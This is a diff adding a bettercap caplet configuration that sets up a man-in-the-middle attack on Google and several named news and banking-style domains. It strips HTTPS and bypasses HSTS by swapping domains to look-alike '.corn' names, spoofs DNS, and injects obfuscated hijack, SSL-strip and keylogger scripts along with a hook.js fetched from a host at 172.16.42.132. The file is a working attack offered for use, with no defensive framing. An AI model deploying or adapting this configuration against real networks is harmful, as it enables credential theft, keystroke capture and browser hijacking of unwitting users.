@@ -1,0 +1,17 @@
+set hstshijack.targets         *.google.com, google.com, gstatic.com, *.gstatic.com,*.germanamerican.com,germanamerican.com,*.wbiw.com,wbiw.com,*.tmnews.com,tmnews.com,*.hpcisp.com,hpcisp.com
+set hstshijack.replacements    *.google.corn,google.corn,gstatic.corn,*.gstatic.corn,*.germanamerican.corn,germanamerican.corn,*.wbiw.corn,wbiw.corn,*.tmnews.corn,tmnews.corn,*.hpcisp.corn,hpcisp.corn
+set hstshijack.ssl.domains     /usr/local/share/bettercap/caplets/hstshijack/domains.txt
+set hstshijack.ssl.index       /usr/local/share/bettercap/caplets/hstshijack/index.json
+set hstshijack.ssl.check       true
+#set hstshijack.blockscripts    example.com,*.example.com
+set hstshijack.obfuscate       true
+set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*:/hook.js
+#set hstshijack.ignore          *.jpg,*.gif,*.svg,*.png
+set http.proxy.injectjs http://172.16.42.132:3000/hook.js
+set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+http.proxy on
+set dns.spoof.all      true
+set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn,*.germanamerican.corn,germanamerican.corn,*.wbiw.corn,wbiw.corn,*.tmnews.corn,tmnews.corn
+set dns.spoof.targets 172.16.42.132
+dns.spoof on
+
